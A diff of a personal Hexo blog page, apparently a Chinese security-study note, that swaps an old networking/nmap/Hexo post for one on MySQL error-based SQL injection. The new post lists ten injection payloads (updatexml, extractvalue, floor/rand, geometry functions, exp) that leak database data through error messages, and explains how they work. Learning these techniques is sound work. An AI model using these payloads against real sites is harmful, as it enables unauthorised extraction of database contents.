@@ -3,9 +3,9 @@
 <head>
   <meta charset="utf-8">
   <meta name="referrer" content="no-referrer" />
-  <title>计算机网络基础及hexo使用 | 个人博客</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="计算机网络基础及hexo使用 | 个人博客">
+  <title>报错注入 | 个人博客</title>
+  <meta name="keywords" content=" SQL注入 , 报错注入 ">
+  <meta name="description" content="报错注入 | 个人博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="mysql语句以英文中的分号结尾   1.在小皮中开启数据库 2.在D:\phpstudy_pro\Extensions\MySQL5.7.26\bin目录下输出cmd，打开控制台。 3.输入mysql -u root -p 小皮数据库的默认账户密码为root和root   4.查看所有的数据库 命令 show databases;   5.创建数据库 create databaase stud">
 <meta property="og:type" content="article">
@@ -543,24 +543,41 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-03计算机网络基础及namp的使用" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-3 报错注入" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">计算机网络基础及hexo使用</h1>
+        <h1 class="article-title">报错注入</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="网安学习">网安学习</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">SQL注入</a>
+            
+            <a class="color5">报错注入</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-07-11 09:35:58'>2024-07-11 09:35</time>
+            发布时间 : <time class="date" title='最后更新: 2024-07-23 20:45:56'>2024-07-23 20:34</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:564</span>
+        <span>字数:646</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -579,7 +596,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80"><span class="toc-text">1.计算机网络基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-namp%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-text">2.namp的使用技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">3.搭建个人博客的注意事项</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">1 报错注入的原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8%E6%97%B6%E6%9C%BA"><span class="toc-text">2 报错注入使用时机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0"><span class="toc-text">3 常用的报错函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-updatexml-%E5%87%BD%E6%95%B0"><span class="toc-text">3.1 updatexml( )函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-text">3.2 extractvalue( )函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3-floor-%E5%87%BD%E6%95%B0"><span class="toc-text">3.3 floor()函数</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -595,62 +612,20 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="1-计算机网络基础"><a href="#1-计算机网络基础" class="headerlink" title="1.计算机网络基础"></a>1.计算机网络基础</h2><ol>
-<li>私网IP地址</li>
-</ol>
-<ul>
-<li>A类：10.0.0.0-10.255.255.255</li>
-<li>B类：172.16.0.0-172.31.255.255</li>
-<li>C类：192.168.0.0-192.168.255.255</li>
+        <h4 id="1-报错注入的原理"><a href="#1-报错注入的原理" class="headerlink" title="1 报错注入的原理"></a>1 报错注入的原理</h4><p>数据库中存在特殊的函数，可以通过人为制造错误条件，让查询信息出现在错误信息中。</p>
+<h4 id="2-报错注入使用时机"><a href="#2-报错注入使用时机" class="headerlink" title="2 报错注入使用时机"></a>2 报错注入使用时机</h4><ul>
+<li>联合注入没有回显的位置</li>
+<li>而且页面存在报错信息</li>
 </ul>
-<ol start="2">
-<li>局域网、城域网、广域网是大小的不同</li>
-</ol>
+<h4 id="3-常用的报错函数"><a href="#3-常用的报错函数" class="headerlink" title="3 常用的报错函数"></a>3 常用的报错函数</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>floor() 　　如：select * from test where id=<span class="number">1</span> and (select <span class="number">1</span> from (select <span class="title function_">count</span><span class="params">(*)</span>,concat(user(),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>extractvalue()　　如：select * from test where id=<span class="number">1</span> and (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select <span class="title function_">user</span><span class="params">()</span>),<span class="number">0x7e</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>updatexml()　　如：select * from test where id=<span class="number">1</span> and (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select <span class="title function_">user</span><span class="params">()</span>),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>geometrycollection()　　如：select * from test where id=<span class="number">1</span> and <span class="title function_">geometrycollection</span><span class="params">((select * from(select * from(select user()</span>)a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>multipoint()　　如：select * from test where id=<span class="number">1</span> and <span class="title function_">multipoint</span><span class="params">((select * from(select * from(select user()</span>)a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>polygon()　　如：select * from test where id=<span class="number">1</span> and <span class="title function_">polygon</span><span class="params">((select * from(select * from(select user()</span>)a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>multipolygon()　　如：select * from test where id=<span class="number">1</span> and <span class="title function_">multipolygon</span><span class="params">((select * from(select * from(select user()</span>)a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>linestring()　　如：select * from test where id=<span class="number">1</span> and <span class="title function_">linestring</span><span class="params">((select * from(select * from(select user()</span>)a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>multilinestring()　　如：select * from test where id=<span class="number">1</span> and <span class="title function_">multilinestring</span><span class="params">((select * from(select * from(select user()</span>)a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span>exp()　　如：select * from test where id=<span class="number">1</span> and <span class="title function_">exp</span><span class="params">(~(select * from(select user()</span>)a));</span><br></pre></td></tr></table></figure>
+<h5 id="3-1-updatexml-函数"><a href="#3-1-updatexml-函数" class="headerlink" title="3.1 updatexml( )函数"></a>3.1 updatexml( )函数</h5><p>updatexml()是一个使用不同的xml标记匹配和替换xml块的函数。<br>作用：改变文档中符合条件的节点的值<br>语法：updatexml（XML_document，XPath_string，new_value）<br>第一个参数：是string格式，为XML文档对象的名称<br>第二个参数：代表路径，Xpath格式的字符串例如<br>第三个参数：string格式，替换查找到的符合条件的数据<br>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</p>
 <ul>
-<li>局域网类型，比如学校</li>
+<li>注意写的时候只要更改基础payload中的sql语句即可</li>
+<li>且最长字符只有32位，可以通过substr函数截取</li>
 </ul>
-<ol start="3">
-<li>特殊IP地址</li>
-</ol>
-<ul>
-<li>255.255.255.255 是广播地址。</li>
-<li>127.0.0.1&#x2F;8 是环回地址，主要是测试设备自身的软件地址。</li>
-<li>169.254.0.0&#x2F;16  没有获取IP地址时，用来临时通信</li>
-</ul>
-<ol start="4">
-<li>桥接和仅主机的区别</li>
-</ol>
-<ul>
-<li>桥接就是利用物理机的网卡，分配真实的IP地址</li>
-<li>nat就是把物理机当作路由器</li>
-</ul>
-<h2 id="2-namp的使用技巧"><a href="#2-namp的使用技巧" class="headerlink" title="2.namp的使用技巧"></a>2.namp的使用技巧</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">namp -p 1=100 ip</span><br><span class="line">-p 				//扫描端口</span><br><span class="line">1-1000		//指定要扫描端口的数量</span><br><span class="line">IP        //目的主机的IP地址</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>可以收集域名信息，通过微步查询IP地址</li>
-</ol>
-<ul>
-<li>查找域名时，最主要是通过对比找打完整的IP地址</li>
-</ul>
-<ol start="2">
-<li>只知道域名信息，也可通过站长之家查询IP地址</li>
-</ol>
-<h2 id="3-搭建个人博客的注意事项"><a href="#3-搭建个人博客的注意事项" class="headerlink" title="3.搭建个人博客的注意事项"></a>3.搭建个人博客的注意事项</h2><ol>
-<li>github的账户名最好不要出现 ‘_’和’-‘ ，容易出现问题</li>
-<li>当经过长时间博客没有更新，可以按顺序使用如下命令。</li>
-</ol>
-<ul>
-<li>hexo clean</li>
-<li>hexo g</li>
-<li>hexo d</li>
-</ul>
-<ol start="3">
-<li><p>hexo的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章</span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面</span><br><span class="line">hexo g == hexo generate #生成</span><br><span class="line">hexo s == hexo server #启动服务预览</span><br><span class="line">hexo d == hexo deploy #部署</span><br><span class="line"></span><br><span class="line">hexo server #Hexo会监视文件变动并自动更新，无须重启服务器</span><br><span class="line">hexo server -s #静态模式</span><br><span class="line">hexo server -p 5000 #更改端口</span><br><span class="line">hexo server -i 192.168.1.1 #自定义 IP</span><br><span class="line">hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</span><br><span class="line">hexo version  #查看Hexo的版本</span><br><span class="line">hexo generate #生成静态页面至public目录</span><br><span class="line"></span><br><span class="line">hexo s -g #生成并本地预览</span><br><span class="line">hexo d -g #生成并上传</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>hexo的目录结构</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-- .deploy      #hexo deploy生成的文件</span><br><span class="line">+-- node_modules  #npm组件</span><br><span class="line">+-- public        #生成的静态网页文件</span><br><span class="line">+--scaffolds      #模板</span><br><span class="line">+-- source        #博客正文和其他源文件</span><br><span class="line">|  +-- _posts    #我们自己写的文章以md结尾</span><br><span class="line">+-- themes        #主题</span><br><span class="line">+-- _config.yml  #全局配置文件</span><br><span class="line">-- package.json  #定义了hexo所需要的各种模</span><br></pre></td></tr></table></figure></li>
-</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46258453/1721732943063-8b292ce1-cf04-4876-9ff0-b32b630f1e4e.png#averageHue=%2341403c&clientId=u6f70c1c0-3aee-4&from=paste&height=220&id=u07f24da6&originHeight=303&originWidth=1848&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=41226&status=done&style=none&taskId=u72c3965e-4fcb-46ca-adf5-f0117128b54&title=&width=1344" alt="image.png"></p>
+<h5 id="3-2-extractvalue-函数"><a href="#3-2-extractvalue-函数" class="headerlink" title="3.2 extractvalue( )函数"></a>3.2 extractvalue( )函数</h5><p>此函数从目标XML中返回包含所查询值的字符串语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串）<br>错误原因也是路径格式不对，发生报错</p>
+<h5 id="3-3-floor-函数"><a href="#3-3-floor-函数" class="headerlink" title="3.3 floor()函数"></a>3.3 floor()函数</h5><p>select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);<br>rand()函数: 随机返回0~1间的小数<br>floor()函数: 小数向下取整数。<br>concat_ws()函数:将括号内数据用第一个字段连接起来<br>group by子句: 分组语句，常用于，结合统计函数，根据一个或多个列，对结果集进行分组<br>as: 别名<br>count()函数:汇总统计数量<br>limit: 这里用于显示指定行数</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
